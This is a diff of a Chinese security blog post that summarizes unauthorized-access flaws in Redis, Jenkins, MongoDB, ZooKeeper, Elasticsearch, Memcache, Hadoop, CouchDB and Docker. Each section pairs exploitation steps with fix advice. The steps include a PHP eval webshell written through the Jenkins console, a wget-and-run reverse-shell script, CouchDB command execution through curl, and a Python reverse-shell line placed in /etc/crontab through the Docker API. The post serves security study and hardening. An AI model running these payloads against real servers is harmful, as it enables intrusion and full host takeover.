@@ -49,7 +49,7 @@
 
 
 <!-- header -->
-<header class="fixbackground" data-img-mode="random" data-normal-src="https://source.unsplash.com/collection/954550/1920x1080" data-random-max="110" data-random-src="http://ankh233.club/Random-img/">
+<header class="fixbackground" data-img-mode="random" data-normal-src="https://source.unsplash.com/collection/954550/1920x1080" data-random-max="110" data-random-src="/img/random/">
 	<div class="mask">
 		<!-- Logo and navigation -->
 		<div class="h-header">
@@ -307,7 +307,7 @@
 
 	<a href="/2019/10/07/越权/" itemprop="url">
 		<time datetime="2019-10-07T13:02:43.000Z" itemprop="dateUpdated">
-	  		2019-10-08
+	  		2019-10-09
 	  </time>
 	</a> 
 
@@ -337,8 +337,8 @@
 
 	<div class="article-content" id="article-content">
 		<h1 id="未授权访问漏洞总结"><a href="#未授权访问漏洞总结" class="headerlink" title="未授权访问漏洞总结"></a>未授权访问漏洞总结</h1><h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p><font color="#ff0000">未授权访问可以理解为需要安全配置或权限认证的地址、授权页面存在缺陷，导致其他用户可以直接访问，从而引发重要权限可被操作、数据库、网站目录等敏感信息泄露。</font></p>
-<h2 id="0x02-redis未授权访问"><a href="#0x02-redis未授权访问" class="headerlink" title="0x02 redis未授权访问"></a>0x02 redis未授权访问</h2><h3 id="①-漏洞描述"><a href="#①-漏洞描述" class="headerlink" title="① 漏洞描述"></a>① 漏洞描述</h3><p>Redis因配置不当可以未授权访问。攻击者无需认证即可访问到内部数据，从而导致敏感数据泄漏，还可以恶意执行flushall清空所有数据。如果Redis是以root的身份运行，可以给root账户写入ssh公钥文件，直接通过ssh登录服务器。</p>
-<h3 id="②-漏洞利用"><a href="#②-漏洞利用" class="headerlink" title="② 漏洞利用"></a>② 漏洞利用</h3><h4 id="1-利用计划任务执行命令反弹shell"><a href="#1-利用计划任务执行命令反弹shell" class="headerlink" title="(1) 利用计划任务执行命令反弹shell"></a>(1) 利用计划任务执行命令反弹shell</h4><p>在redis以root权限运行时可以crontab执行命令反弹shell</p>
+<h2 id="0x02-redis未授权访问"><a href="#0x02-redis未授权访问" class="headerlink" title="0x02 redis未授权访问"></a>0x02 redis未授权访问</h2><h3 id="2-1-漏洞描述"><a href="#2-1-漏洞描述" class="headerlink" title="2.1 漏洞描述"></a>2.1 漏洞描述</h3><p>Redis因配置不当可以未授权访问。攻击者无需认证即可访问到内部数据，从而导致敏感数据泄漏，还可以恶意执行flushall清空所有数据。如果Redis是以root的身份运行，可以给root账户写入ssh公钥文件，直接通过ssh登录服务器。</p>
+<h3 id="2-2-漏洞利用"><a href="#2-2-漏洞利用" class="headerlink" title="2.2 漏洞利用"></a>2.2 漏洞利用</h3><h4 id="1-利用计划任务执行命令反弹shell"><a href="#1-利用计划任务执行命令反弹shell" class="headerlink" title="(1) 利用计划任务执行命令反弹shell"></a>(1) 利用计划任务执行命令反弹shell</h4><p>在redis以root权限运行时可以crontab执行命令反弹shell</p>
 <p>先在自己服务器上监听一个端口</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 2333</span><br></pre></td></tr></table></figure>
 
@@ -363,31 +363,157 @@
 <p>执行以下命令</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">victimip:6379&gt; config set dir /var/www/html/</span><br><span class="line">OK</span><br><span class="line">victimip:6379&gt; config set dbfilename shell.php</span><br><span class="line">OK</span><br><span class="line">victimip:6379&gt; set x "&lt;?php phpinfo();?&gt;"</span><br><span class="line">OK</span><br><span class="line">victimip:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
 
-<h3 id="③-漏洞修复"><a href="#③-漏洞修复" class="headerlink" title="③ 漏洞修复"></a>③ 漏洞修复</h3><p>可以配置redis.conf这个文件，在安装目录下</p>
+<h3 id="2-3-修复建议"><a href="#2-3-修复建议" class="headerlink" title="2.3 修复建议"></a>2.3 修复建议</h3><p>可以配置redis.conf这个文件，在安装目录下</p>
 <ul>
 <li>1、默认只对本地开放  </li>
 <li>2、添加登陆密码</li>
 <li>3、在需要对外开放的时候修改默认端口</li>
 <li>4、限制ip登陆</li>
 </ul>
-<h2 id="0x03-Jenkins未授权访问"><a href="#0x03-Jenkins未授权访问" class="headerlink" title="0x03 Jenkins未授权访问"></a>0x03 Jenkins未授权访问</h2><h3 id="①-漏洞描述-1"><a href="#①-漏洞描述-1" class="headerlink" title="① 漏洞描述"></a>① 漏洞描述</h3><p>默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p>
-<h3 id="②-漏洞利用-1"><a href="#②-漏洞利用-1" class="headerlink" title="② 漏洞利用"></a>② 漏洞利用</h3><h4 id="1、Jenkins未授权访问写webshell"><a href="#1、Jenkins未授权访问写webshell" class="headerlink" title="1、Jenkins未授权访问写webshell"></a>1、Jenkins未授权访问写webshell</h4><h5 id="1-1-访问"><a href="#1-1-访问" class="headerlink" title="1.1 访问"></a>1.1 访问</h5><p><code>victim:8080/manage</code><br><code>victim:8080/script</code></p>
+<h2 id="0x03-Jenkins未授权访问"><a href="#0x03-Jenkins未授权访问" class="headerlink" title="0x03 Jenkins未授权访问"></a>0x03 Jenkins未授权访问</h2><h3 id="3-1-漏洞描述"><a href="#3-1-漏洞描述" class="headerlink" title="3.1 漏洞描述"></a>3.1 漏洞描述</h3><p>默认情况下Jenkins面板中用户可以选择执行脚本界面来操作一些系统层命令，攻击者可通过未授权访问漏洞或者暴力破解用户密码等进脚本执行界面从而获取服务器权限。</p>
+<h3 id="3-2-漏洞利用"><a href="#3-2-漏洞利用" class="headerlink" title="3.2 漏洞利用"></a>3.2 漏洞利用</h3><h4 id="1、Jenkins未授权访问写webshell"><a href="#1、Jenkins未授权访问写webshell" class="headerlink" title="1、Jenkins未授权访问写webshell"></a>1、Jenkins未授权访问写webshell</h4><h5 id="1）-访问"><a href="#1）-访问" class="headerlink" title="1） 访问"></a>1） 访问</h5><p><code>victim:8080/manage</code><br><code>victim:8080/script</code></p>
 <p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7r4ok3o3vj30fe079dho.jpg" alt></p>
-<h5 id="1-2-点击脚本命令行"><a href="#1-2-点击脚本命令行" class="headerlink" title="1.2 点击脚本命令行"></a>1.2 点击脚本命令行</h5><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7r4qv245zj30fe07o0uq.jpg" alt></p>
-<h5 id="1-3-执行系统命令，成功执行命令"><a href="#1-3-执行系统命令，成功执行命令" class="headerlink" title="1.3 执行系统命令，成功执行命令"></a>1.3 执行系统命令，成功执行命令</h5><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7r4rpgvoij30fe096wf9.jpg" alt></p>
-<h5 id="1-4-上传webshell"><a href="#1-4-上传webshell" class="headerlink" title="1.4 上传webshell"></a>1.4 上传webshell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new File(&quot;/var/www/html/media.php&quot;).write(&apos;&lt;?php @eval($_POST[cmd]);?&gt;&apos;);</span><br></pre></td></tr></table></figure>
+<h5 id="2）点击脚本命令行"><a href="#2）点击脚本命令行" class="headerlink" title="2）点击脚本命令行"></a>2）点击脚本命令行</h5><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7r4qv245zj30fe07o0uq.jpg" alt></p>
+<h5 id="3）-执行系统命令，成功执行命令"><a href="#3）-执行系统命令，成功执行命令" class="headerlink" title="3） 执行系统命令，成功执行命令"></a>3） 执行系统命令，成功执行命令</h5><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7r4rpgvoij30fe096wf9.jpg" alt></p>
+<h5 id="4）上传webshell"><a href="#4）上传webshell" class="headerlink" title="4）上传webshell"></a>4）上传webshell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new File(&quot;/var/www/html/media.php&quot;).write(&apos;&lt;?php @eval($_POST[cmd]);?&gt;&apos;);</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7r4tlu431j30fe0520tn.jpg" alt></p>
-<h5 id="1-5-点击运行，未报错，上传成功"><a href="#1-5-点击运行，未报错，上传成功" class="headerlink" title="1.5 点击运行，未报错，上传成功"></a>1.5 点击运行，未报错，上传成功</h5><h5 id="1-6-菜刀连接"><a href="#1-6-菜刀连接" class="headerlink" title="1.6 菜刀连接"></a>1.6 菜刀连接</h5><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7r4uh4pufj30fe08774p.jpg" alt></p>
+<h5 id="5）点击运行，未报错，上传成功"><a href="#5）点击运行，未报错，上传成功" class="headerlink" title="5）点击运行，未报错，上传成功"></a>5）点击运行，未报错，上传成功</h5><h5 id="6）菜刀连接"><a href="#6）菜刀连接" class="headerlink" title="6）菜刀连接"></a>6）菜刀连接</h5><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7r4uh4pufj30fe08774p.jpg" alt></p>
 <h4 id="2、执行系统命令"><a href="#2、执行系统命令" class="headerlink" title="2、执行系统命令"></a>2、执行系统命令</h4><h5 id="1）println-“ifconfig-a”-execute-text执行一些系统命令"><a href="#1）println-“ifconfig-a”-execute-text执行一些系统命令" class="headerlink" title="1）println “ifconfig -a”.execute().text执行一些系统命令"></a>1）println “ifconfig -a”.execute().text执行一些系统命令</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def sout = new StringBuffer(), serr = new StringBuffer()</span><br><span class="line"></span><br><span class="line">def proc = &apos;[INSERT COMMAND]&apos;.execute()</span><br><span class="line"></span><br><span class="line">proc.consumeProcessOutput(sout, serr)</span><br><span class="line"></span><br><span class="line">proc.waitForOrKill(1000)</span><br><span class="line"></span><br><span class="line">println &quot;out&gt; $sout err&gt; $serr&quot;</span><br></pre></td></tr></table></figure>
 
 <h5 id="2）直接wget下载back-py反弹shell"><a href="#2）直接wget下载back-py反弹shell" class="headerlink" title="2）直接wget下载back.py反弹shell"></a>2）直接wget下载back.py反弹shell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">println &quot;wget http://xxx.victim.com/tools/back.py -P /tmp/&quot;.execute().text</span><br><span class="line"></span><br><span class="line">println &quot;python /tmp/back.py 10.1.1.111 8080&quot;.execute().text</span><br></pre></td></tr></table></figure>
 
-<h3 id="③-漏洞修复-1"><a href="#③-漏洞修复-1" class="headerlink" title="③ 漏洞修复"></a>③ 漏洞修复</h3><ul>
+<h3 id="3-3-修复建议"><a href="#3-3-修复建议" class="headerlink" title="3.3 修复建议"></a>3.3 修复建议</h3><ul>
 <li>1、禁止把Jenkins直接暴露在公网</li>
 <li>2、添加认证，设置强密码复杂度及账号锁定。</li>
 </ul>
-<h2 id="0x04-MongoDB未授权访问"><a href="#0x04-MongoDB未授权访问" class="headerlink" title="0x04 MongoDB未授权访问"></a>0x04 MongoDB未授权访问</h2>	
+<h2 id="0x04-MongoDB未授权访问"><a href="#0x04-MongoDB未授权访问" class="headerlink" title="0x04 MongoDB未授权访问"></a>0x04 MongoDB未授权访问</h2><h3 id="4-1-漏洞描述"><a href="#4-1-漏洞描述" class="headerlink" title="4.1 漏洞描述"></a>4.1 漏洞描述</h3><p>MongoDB 在启动的时候提供了很多参数，如日志记录到哪个文件夹，是否开启认证等。造成未授权访问的根本原因就在于启动 MongoDB 的时候未设置 –auth 也很少会有人会给数据库添加上账号密码（默认空口令），使用默认空口令这将导致恶意攻击者无需进行账号认证就可以登陆到数据服务器</p>
+<h3 id="4-2-漏洞利用"><a href="#4-2-漏洞利用" class="headerlink" title="4.2 漏洞利用"></a>4.2 漏洞利用</h3><p>默认开在27017端口，新版本默认绑定在本地</p>
+<h2 id="0x05-ZooKeeper未授权访问"><a href="#0x05-ZooKeeper未授权访问" class="headerlink" title="0x05 ZooKeeper未授权访问"></a>0x05 ZooKeeper未授权访问</h2><h3 id="5-1-漏洞描述"><a href="#5-1-漏洞描述" class="headerlink" title="5.1 漏洞描述"></a>5.1 漏洞描述</h3><p>Zookeeper的默认开放端口是2181。</p>
+<p>Zookeeper安装部署之后默认情况下不需要任何身份验证，造成攻击者可以远程利用Zookeeper，通过服务器收集敏感信息或者在Zookeeper集群内进行破坏（比如：kill命令）。攻击者能够执行所有只允许由管理员运行的命令。</p>
+<h3 id="5-2-漏洞利用"><a href="#5-2-漏洞利用" class="headerlink" title="5.2 漏洞利用"></a>5.2 漏洞利用</h3><p>执行以下命令即可远程获取该服务器的环境：</p>
+<p><code>echo envi | nc victimip 2181</code></p>
+<p>直接连接：</p>
+<p><code>./zkCli.sh -server victimip:2181</code></p>
+<h3 id="5-3-修复建议"><a href="#5-3-修复建议" class="headerlink" title="5.3 修复建议"></a>5.3 修复建议</h3><ul>
+<li>1、禁止把Zookeeper直接暴露在公网</li>
+<li>2、添加访问控制，根据情况选择对应方式（认证用户，用户名密码）</li>
+<li>3、绑定指定IP访问</li>
+</ul>
+<h2 id="0x06-Elasticserch未授权访问"><a href="#0x06-Elasticserch未授权访问" class="headerlink" title="0x06 Elasticserch未授权访问"></a>0x06 Elasticserch未授权访问</h2><h3 id="6-1-漏洞描述"><a href="#6-1-漏洞描述" class="headerlink" title="6.1 漏洞描述"></a>6.1 漏洞描述</h3><p>Elasticsearch服务普遍存在一个未授权访问的问题，服务默认开放9200或9300端口，可被非法操作数据。</p>
+<h3 id="6-2-漏洞利用"><a href="#6-2-漏洞利用" class="headerlink" title="6.2 漏洞利用"></a>6.2 漏洞利用</h3><ul>
+<li>漏洞检测：</li>
+</ul>
+<p>相当于一个API，任何人访问这个地址，就可以调用api，进行数据的增删改操作。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://victim:9200/_nodes            查看节点数据</span><br><span class="line">http://victim:9200/_plugin/head/     web管理界面</span><br><span class="line">http://victim:9200/_river/_search    查看数据库敏感信息</span><br><span class="line">http://victim:9200/_cat/indices      查看集群当前状态</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-修复建议"><a href="#6-3-修复建议" class="headerlink" title="6.3 修复建议"></a>6.3 修复建议</h3><ul>
+<li><p>防火墙上设置禁止外网访问9200端口。</p>
+</li>
+<li><p>使用Nginx搭建反向代理，通过配置Nginx实现对Elasticsearch的认证</p>
+</li>
+<li><p>限制IP访问，绑定固定IP</p>
+</li>
+<li><p>在config/elasticsearch.yml中为9200端口设置认证：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http.basic.enabled true #开关，开启会接管全部HTTP连接</span><br><span class="line">http.basic.user &quot;admin&quot; #账号</span><br><span class="line">http.basic.password &quot;admin_pw&quot; #密码</span><br><span class="line">http.basic.ipwhitelist [&quot;localhost&quot;, &quot;127.0.0.1&quot;]</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="0x07-Memcache未授权访问"><a href="#0x07-Memcache未授权访问" class="headerlink" title="0x07 Memcache未授权访问"></a>0x07 Memcache未授权访问</h2><h3 id="7-1-漏洞描述"><a href="#7-1-漏洞描述" class="headerlink" title="7.1 漏洞描述"></a>7.1 漏洞描述</h3><p>memcached是一套分布式的高速缓存系统。它以Key-Value（键值对）形式将数据存储在内存中，这些数据通常是应用读取频繁的。正因为内存中数据的读取远远大于硬盘，因此可以用来加速应用的访问。由于memcached安全设计缺陷，客户端连接memcached服务器后无需认证就可读取、修改服务器缓存内容。</p>
+<p>默认开放11211</p>
+<h3 id="7-2-漏洞利用"><a href="#7-2-漏洞利用" class="headerlink" title="7.2 漏洞利用"></a>7.2 漏洞利用</h3><ul>
+<li><p>漏洞验证</p>
+<p><code>telnet victimip 11211, 或者nc -vv victimip 11211 连接成功则漏洞存在</code></p>
+</li>
+</ul>
+<h3 id="7-3-修复建议"><a href="#7-3-修复建议" class="headerlink" title="7.3 修复建议"></a>7.3 修复建议</h3><ul>
+<li>配置memcached监听本地回环地址127.0.0.1。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 [root@local ~]# vim /etc/sysconfig/memcached</span><br><span class="line">2 OPTIONS=&quot;-l 127.0.0.1&quot;  #设置本地为监听</span><br><span class="line">3 [root@local ~]# /etc/init.d/memcached restart #重启服务</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>当memcached配置为监听内网IP或公网IP时，使用主机防火墙（iptalbes、firewalld等）和网络防火墙对memcached服务端口进行过滤。</p>
+</li>
+<li><p>最小化权限运行</p>
+<p>使用普通权限账号运行，以下指定memcached 用户运行</p>
+<p>memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid</p>
+</li>
+<li><p>配置账户、密码</p>
+</li>
+</ul>
+<h2 id="0x08-Hadoop未授权访问"><a href="#0x08-Hadoop未授权访问" class="headerlink" title="0x08 Hadoop未授权访问"></a>0x08 Hadoop未授权访问</h2><h3 id="8-1-漏洞描述"><a href="#8-1-漏洞描述" class="headerlink" title="8.1 漏洞描述"></a>8.1 漏洞描述</h3><p>由于服务器直接在开放了Hadoop机器HDFS的50070 web端口及部分默认服务端口，黑客可以通过命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作，产生极大的危害。</p>
+<h3 id="8-2-漏洞利用"><a href="#8-2-漏洞利用" class="headerlink" title="8.2 漏洞利用"></a>8.2 漏洞利用</h3><p>主要HDFS和MapReduce的WebUI对应的服务端口。</p>
+<p>其中比较重要的是DataNode 默认端口50075开放的话，攻击者可以通过hdsf提供的restful api对hdfs存储数据进行操作。</p>
+<ul>
+<li><p>HDFS</p>
+<p>NameNode 默认端口 50070</p>
+<p>DataNode 默认端口 50075</p>
+<p>httpfs 默认端口14000</p>
+<p>journalnode 默认端口 8480</p>
+</li>
+<li><p>YARN（JobTracker）</p>
+<p>ResourceManager 默认端口8088</p>
+<p>JobTracker 默认端口 50030</p>
+<p>TaskTracker 默认端口 50060</p>
+</li>
+<li><p>Hue 默认端口 8080</p>
+</li>
+<li><p>YARN（JobTracker）</p>
+<p>master 默认端口 60010</p>
+<p>regionserver 默认端口60030</p>
+</li>
+<li><p>hive-server2 默认端口 10000</p>
+</li>
+<li><p>spark-jdbcserver 默认端口 10003</p>
+</li>
+</ul>
+<h2 id="0x09-CouchDB未授权访问"><a href="#0x09-CouchDB未授权访问" class="headerlink" title="0x09 CouchDB未授权访问"></a>0x09 CouchDB未授权访问</h2><h3 id="9-1-漏洞描述"><a href="#9-1-漏洞描述" class="headerlink" title="9.1 漏洞描述"></a>9.1 漏洞描述</h3><p>CouchDB默认在5984端口开放Restful的API接口，用于数据库的管理功能。其HTTP Server默认开启时没有进行验证，而且绑定在0.0.0.0，所有用户均可通过API访问导致未授权访问。任何连接到服务器端口上的人，都可以调用相关API对服务器上的数据进行任意的增删改查，其中通过API修改local.ini配置文件，可进一步导致执行任意系统命令，获取服务器权限！</p>
+<p>CouchDB允许用户指定一个二进制程序或者脚本，与CouchDB进行数据交互和处理</p>
+<h3 id="9-2-漏洞利用"><a href="#9-2-漏洞利用" class="headerlink" title="9.2 漏洞利用"></a>9.2 漏洞利用</h3><h4 id="1）新增query-server配置，这里执行ifconfig命令"><a href="#1）新增query-server配置，这里执行ifconfig命令" class="headerlink" title="1）新增query_server配置，这里执行ifconfig命令"></a>1）新增<code>query_server</code>配置，这里执行ifconfig命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT 'http://victimip:5984/_config/query_servers/cmd' -d '"/sbin/ifconfig &gt;/tmp/6666"'</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-新建一个临时表，插入一条记录"><a href="#2-新建一个临时表，插入一条记录" class="headerlink" title="2) 新建一个临时表，插入一条记录"></a>2) 新建一个临时表，插入一条记录</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT 'http://victimip:5984/vultest'</span><br><span class="line">curl -X PUT 'http://victimip:5984/vultest/vul' -d '&#123;"_id":"770895a97726d5ca6d70a22173005c7b"&#125;'</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-调用query-server处理数据"><a href="#3-调用query-server处理数据" class="headerlink" title="3) 调用query_server处理数据"></a>3) 调用<code>query_server</code>处理数据</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST 'http://victimip:5984/vultest/_temp_view?limit=11' -d '&#123;"language":"cmd","map":""&#125;' -H 'Content-Type: application/json'</span><br></pre></td></tr></table></figure>
+
+<h3 id="9-3-修复建议"><a href="#9-3-修复建议" class="headerlink" title="9.3 修复建议"></a>9.3 修复建议</h3><ul>
+<li><p>指定CouchDB绑定的IP （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 文件中找到 “bind_address = 0.0.0.0” ，把 0.0.0.0 修改为 127.0.0.1 ，然后保存。注：修改后只有本机才能访问CouchDB。</p>
+</li>
+<li><p>设置访问密码 （需要重启CouchDB才能生效） 在 /etc/couchdb/local.ini 中找到“[admins]”字段配置密码。</p>
+</li>
+</ul>
+<h2 id="0x10-docker未授权访问"><a href="#0x10-docker未授权访问" class="headerlink" title="0x10 docker未授权访问"></a>0x10 docker未授权访问</h2><h3 id="10-1-漏洞描述"><a href="#10-1-漏洞描述" class="headerlink" title="10.1 漏洞描述"></a>10.1 漏洞描述</h3><p>该未授权访问漏洞是因为docker remote api可以执行docker命令，从官方文档可以看出，该接口是目的是取代docker 命令界面，通过url操作docker。</p>
+<p>url输入<code>victimip:2375/version</code>就会列出基本信息，和<code>docker version</code>命令效果一样。</p>
+<p>url为<code>victimip:2375/v1.23/containers/json</code>会列出容器信息，和<code>docker ps -a</code>效果一样。</p>
+<h3 id="10-2-漏洞利用"><a href="#10-2-漏洞利用" class="headerlink" title="10.2 漏洞利用"></a>10.2 漏洞利用</h3><h4 id="1）利用方式一"><a href="#1）利用方式一" class="headerlink" title="1）利用方式一"></a>1）利用方式一</h4><p>启动一个容器，挂载宿主机的/root/目录，之后将攻击者的ssh公钥~/.ssh/id_rsa.pub的内容写到入宿主机的/root/.ssh/authorized_keys文件中，之后就可以用root账户直接登录了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen             						      #生成公钥文件</span><br><span class="line">docker -H tcp://remoteip:2375 images    #查看镜像</span><br><span class="line">docker -H tcp://remoteip:2375 run -it -v /:/mnt imageId /bin/bash 启动一个容器并将宿主机根目录挂在到容器的mnt目录</span><br><span class="line">mkdir .ssh                              #创建ssh目录</span><br><span class="line">touch authorized_keys                   #创建文件</span><br></pre></td></tr></table></figure>
+
+<p>将公钥的文件写入authorized_keys</p>
+<p><code>ssh root@remoteip #免密码登录宿主机</code></p>
+<h4 id="2）利用方式二"><a href="#2）利用方式二" class="headerlink" title="2）利用方式二"></a>2）利用方式二</h4><p>启动一个容器，挂载宿主机的/etc/目录，之后将反弹shell的脚本写入到/etc/crontab中，攻击者会得到一个反弹的shell，其中反弹shell脚本的样例如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo -e "*/1 * * * * root /usr/bin/python -c 'import</span><br><span class="line">socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8088));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n" &gt;&gt; /etc/crontab</span><br></pre></td></tr></table></figure>
+
+<p>第2种利用方法也可以挂载var/spool/cron/目录，将反弹shell的脚本写入到/var/spool/cron/root（centos系统）或/var/spool/cron/crontabs/root(ubuntu系统)</p>
+<h3 id="10-3-修复建议"><a href="#10-3-修复建议" class="headerlink" title="10.3 修复建议"></a>10.3 修复建议</h3><p>1、在不必需的情况下，不要启用docker的remote api服务，如果必须使用的话，可以采用如下的加固方式：</p>
+<ul>
+<li>设置ACL，仅允许信任的来源IP连接；</li>
+<li>设置TLS认证，官方的文档为Protect the Docker daemon socket</li>
+</ul>
+<p>2、客户端连接时需要设置以下环境变量export DOCKER_TLS_VERIFY=1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export DOCKER_CERT_PATH=~/.docker</span><br><span class="line">export DOCKER_HOST=tcp://10.10.10.10:2375</span><br><span class="line">export DOCKER_API_VERSION=1.12</span><br></pre></td></tr></table></figure>
+
+<p>3、在 docker api 服务器前面加一个代理，例如 nginx，设置 401 认证</p>
+<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p><em>霜须七十期同老，云水之乡。总挂冠裳。闲里光阴一倍长。</em><br><em>况逢菊靥篱边笑，风露中香。报答秋光。自有仙人九酝觞。</em></p>
+<p align="right">—————采桑子·芗林为牧庵舅作</p>
+
+
+
+
+
+
+
+
+
+	
 	</div>
 	
 	<div id="current-post-cover" data-scr="/img/random/100.jpg"></div>
